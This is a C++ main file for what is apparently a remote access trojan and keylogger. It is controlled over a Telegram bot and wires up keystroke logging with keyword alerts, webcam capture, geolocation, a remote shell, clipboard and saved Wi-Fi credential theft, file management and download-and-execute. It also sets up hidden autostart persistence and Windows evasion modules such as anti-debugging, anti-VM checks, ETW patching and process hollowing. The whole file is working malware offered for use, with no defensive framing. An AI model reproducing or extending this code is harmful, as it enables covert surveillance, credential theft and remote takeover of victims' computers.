#include <atomic>
#include <fstream>
#include <iostream>
#include <memory>
#include <string>
#include <thread>

#include <nlohmann/json.hpp>

// Domain
#include "domain/services/KeystrokeService.hpp"
#include "domain/services/EncryptionService.hpp"
#include "domain/services/ReportingService.hpp"
#include "domain/entities/Config.hpp"
#include "domain/common/Logger.hpp"
#include "domain/common\StringTable.hpp"
#include "domain/common/Installer.hpp"

// Application
#include "application/commands/CommandHandler.hpp"
#include "application/commands/MediaHandler.hpp"
#include "application/commands/LocationHandler.hpp"
#include "application/commands/ShellHandler.hpp"
#include "application/commands/SysInfoHandler.hpp"
#include "application/commands/ClipboardHandler.hpp"
#include "application/commands/ProcessHandler.hpp"
#include "application/commands/WifiHandler.hpp"
#include "application/commands/FileManagerHandler.hpp"
#include "application/commands/DownloadExecHandler.hpp"
#include "application/commands/KeywordAlertHandler.hpp"

// Infrastructure
#include "infrastructure/telegram/TelegramBot.hpp"
#include "infrastructure/media/OpenCVMediaCapture.hpp"
#include "infrastructure/network/IPGeolocationService.hpp"
#include "infrastructure/system/ActivityLogger.hpp"

using namespace nuub;

#ifdef _WIN32
#include "infrastructure/keyboard/WindowsKeyListener.hpp"
#include "infrastructure/system/WindowsPersistence.hpp"
#include "domain/common/AntiAnalysis.hpp"
#include "domain/common/EtwPatch.hpp"
#include "domain/common/ModuleStomping.hpp"
#include "domain/common/FilelessExec.hpp"
#include "domain/common/EvasionManager.hpp"
#include "infrastructure/system/WindowsShellService.hpp"
#include "infrastructure/system/WindowsSysInfoService.hpp"
#include "infrastructure/system/WindowsClipboardService.hpp"
#include "infrastructure/system/WindowsProcessService.hpp"
#include "infrastructure/system/WindowsWifiService.hpp"
#include "infrastructure/system/WindowsFileManagerService.hpp"
#include "infrastructure/system/WindowsDownloadExecService.hpp"
using KeyListener = infrastructure::keyboard::WindowsKeyListener;
using Persistence = infrastructure::system::WindowsPersistence;
using ShellService = infrastructure::system::WindowsShellService;
using SysInfoService = infrastructure::system::WindowsSysInfoService;
using ClipboardService = infrastructure::system::WindowsClipboardService;
using ProcessService = infrastructure::system::WindowsProcessService;
using WifiService = infrastructure::system::WindowsWifiService;
using FileManagerService = infrastructure::system::WindowsFileManagerService;
using DownloadExecService = infrastructure::system::WindowsDownloadExecService;
#elif defined(__linux__)
#include "infrastructure/keyboard/LinuxKeyListener.hpp"
#include "infrastructure/system/LinuxPersistence.hpp"
#include "infrastructure/system/ShellService.hpp"
using KeyListener = infrastructure::keyboard::LinuxKeyListener;
using Persistence = infrastructure::system::LinuxPersistence;
using ShellService = infrastructure::system::ShellService;
// Linux stubs for services not yet implemented
class SysInfoService : public application::interfaces::ISysInfoService {
    std::string get_system_info() override { return "Linux sysinfo not implemented"; }
};
class ClipboardService : public application::interfaces::IClipboardService {
    std::string get_clipboard() override { return ""; }
    void set_clipboard(const std::string&) override {}
};
class ProcessService : public application::interfaces::IProcessService {
    std::string list_processes() override { return "Linux ps not implemented"; }
    bool kill_process(int) override { return false; }
};
class WifiService : public application::interfaces::IWifiService {
    std::string get_saved_networks() override { return "Linux wifi not implemented"; }
};
class FileManagerService : public application::interfaces::IFileManagerService {
    std::string list_directory(const std::string&) override { return ""; }
    bool create_directory(const std::string&) override { return false; }
    bool delete_file(const std::string&) override { return false; }
    bool delete_directory(const std::string&) override { return false; }
    std::optional<std::string> read_file(const std::string&) override { return std::nullopt; }
    bool write_file(const std::string&, const std::string&) override { return false; }
    bool file_exists(const std::string&) override { return false; }
};
class DownloadExecService : public application::interfaces::IDownloadExecService {
    std::string download_and_execute(const std::string&) override { return "Linux downloadexec not implemented"; }
};
#endif

int main(int argc, char* argv[]) {
    // Initialize string table for encrypted strings
    domain::StringTable::init();

    std::string config_path = "config.json";
    if (argc > 1) {
        config_path = argv[1];
    }

    // Auto-installer: if config doesn't exist, run setup
    if (domain::Installer::needs_setup(config_path)) {
        if (!domain::Installer::run_setup(config_path)) {
            std::cerr << "Setup failed. Exiting." << std::endl;
            return 1;
        }
    }

    domain::entities::Config config;
    try {
        std::ifstream file(config_path);
        if (!file.is_open()) {
            throw std::runtime_error("Cannot open config file: " + config_path);
        }

        nlohmann::json j;
        file >> j;

        if (j.contains("telegram_bot_token"))
            config.telegram_bot_token = j["telegram_bot_token"].get<std::string>();
        if (j.contains("admin_chat_id"))
            config.admin_chat_id = j["admin_chat_id"].get<std::int64_t>();
        if (j.contains("admin_chat_ids"))
            config.admin_chat_ids = j["admin_chat_ids"].get<std::vector<std::int64_t>>();
        if (j.contains("pc_identifier"))
            config.pc_identifier = j["pc_identifier"].get<std::string>();
        if (j.contains("encryption_password"))
            config.encryption_password = j["encryption_password"].get<std::string>();
        if (j.contains("master_log_filename"))
            config.master_log_filename = j["master_log_filename"].get<std::string>();
        if (j.contains("activity_log_filename"))
            config.activity_log_filename = j["activity_log_filename"].get<std::string>();
        if (j.contains("auto_start_entry_name"))
            config.auto_start_entry_name = j["auto_start_entry_name"].get<std::string>();
        if (j.contains("log_filename"))
            config.log_filename = j["log_filename"].get<std::string>();
        if (j.contains("heartbeat_interval_minutes"))
            config.heartbeat_interval_minutes = j["heartbeat_interval_minutes"].get<int>();

        // Load evasion settings
        if (j.contains("stealth_mode"))
            config.stealth_mode = j["stealth_mode"].get<bool>();
        if (j.contains("anti_debug"))
            config.anti_debug = j["anti_debug"].get<bool>();
        if (j.contains("anti_vm"))
            config.anti_vm = j["anti_vm"].get<bool>();
        if (j.contains("etw_patch"))
            config.etw_patch = j["etw_patch"].get<bool>();
        if (j.contains("process_hollowing"))
            config.process_hollowing = j["process_hollowing"].get<bool>();

        if (!config.admin_chat_ids.empty()) {
            // Use the list
        } else if (config.admin_chat_id != 0) {
            config.admin_chat_ids.push_back(config.admin_chat_id);
        }

        if (config.telegram_bot_token.empty() || config.encryption_password.empty()) {
            throw std::runtime_error("Config: telegram_bot_token and encryption_password are required");
        }
    } catch (const std::exception& e) {
        std::cerr << "Error loading config: " << e.what() << std::endl;
        std::cerr << "Usage: " << argv[0] << " [config.json]" << std::endl;
        return 1;
    }

    // Initialize logging
    domain::Logger::init(config.log_filename);
    spdlog::info("Starting agent on PC: {}", config.pc_identifier);

#ifdef _WIN32
    // Initialize evasion manager with config settings
    domain::EvasionManager::Config evasion_cfg;
    evasion_cfg.stealth_mode = config.stealth_mode;
    evasion_cfg.anti_debug = config.anti_debug;
    evasion_cfg.anti_vm = config.anti_vm;
    evasion_cfg.etw_patch = config.etw_patch;
    evasion_cfg.process_hollowing = config.process_hollowing;
    domain::EvasionManager::instance().configure(evasion_cfg);
    domain::EvasionManager::instance().initialize();
#endif

    // ── Domain Services ──────────────────────────────────────
    domain::services::KeystrokeService keystroke_service;
    domain::services::EncryptionService encryption_service(config.encryption_password);
    domain::services::ReportingService reporting_service(
        encryption_service, config.master_log_filename, config.pc_identifier);

    // ── Infrastructure ───────────────────────────────────────
    infrastructure::telegram::TelegramBot telegram(
        config.telegram_bot_token, config.admin_chat_ids, config.pc_identifier);
    KeyListener key_listener(keystroke_service);
    infrastructure::media::OpenCVMediaCapture media_capture(config.pc_identifier);
    infrastructure::network::IPGeolocationService geolocation;
    infrastructure::system::ActivityLogger activity_logger(
        config.activity_log_filename, config.pc_identifier);
    Persistence persistence(config.pc_identifier, config.auto_start_entry_name);
    ShellService shell_service;
    SysInfoService sysinfo_service;
    ClipboardService clipboard_service;
    ProcessService process_service;
    WifiService wifi_service;
    FileManagerService filemgr_service;
    DownloadExecService dl_service;

    // ── Application Handlers ─────────────────────────────────
    std::atomic<bool> shutdown_flag{false};

    application::commands::CommandHandler command_handler(
        keystroke_service, reporting_service, telegram.reporter(),
        config.pc_identifier,
        [&shutdown_flag]() { shutdown_flag = true; });

    application::commands::MediaHandler media_handler(
        media_capture, telegram.reporter(), config.pc_identifier);

    application::commands::LocationHandler location_handler(
        geolocation, telegram.reporter(), config.pc_identifier);

    application::commands::ShellHandler shell_handler(
        shell_service, telegram.reporter(), config.pc_identifier);

    application::commands::SysInfoHandler sysinfo_handler(
        sysinfo_service, telegram.reporter(), config.pc_identifier);

    application::commands::ClipboardHandler clipboard_handler(
        clipboard_service, telegram.reporter(), config.pc_identifier);

    application::commands::ProcessHandler process_handler(
        process_service, telegram.reporter(), config.pc_identifier);

    application::commands::WifiHandler wifi_handler(
        wifi_service, telegram.reporter(), config.pc_identifier);

    application::commands::FileManagerHandler filemgr_handler(
        filemgr_service, telegram.reporter(), config.pc_identifier);

    application::commands::DownloadExecHandler dl_handler(
        dl_service, telegram.reporter(), config.pc_identifier);

    application::commands::KeywordAlertHandler alert_handler(
        keystroke_service, telegram.reporter(), config.pc_identifier);

    // Wire keyword alert callback
    keystroke_service.set_keyword_callback([&telegram](const std::string& msg) {
        telegram.reporter().send_message("KEYWORD ALERT: " + msg);
    });

    // Wire handlers to Telegram bot
    telegram.set_handlers(
        command_handler, media_handler, location_handler, shell_handler,
        sysinfo_handler, clipboard_handler, process_handler, wifi_handler,
        filemgr_handler, dl_handler, alert_handler);

    // ── System Setup ─────────────────────────────────────────
    persistence.hide_console();
    persistence.configure_auto_start();
    activity_logger.register_event("STARTUP");
    persistence.start_anti_sleep();

    // Start keyboard listener
    key_listener.start();

    // Start Telegram bot (polling in background thread)
    std::thread telegram_thread([&telegram]() {
        telegram.start();
    });

    // Hidden window for shutdown detection
    persistence.create_hidden_window([&]() {
        spdlog::info("Shutdown signal received");
        activity_logger.register_event("SHUTDOWN");
        persistence.stop_anti_sleep();
        key_listener.stop();
        telegram.stop();
        spdlog::info("Agent shutting down");
        std::exit(0);
    });

    spdlog::info("Agent started. Waiting for Telegram commands...");

    // Message pump (blocks until quit)
    persistence.pump_messages();

    return 0;
}
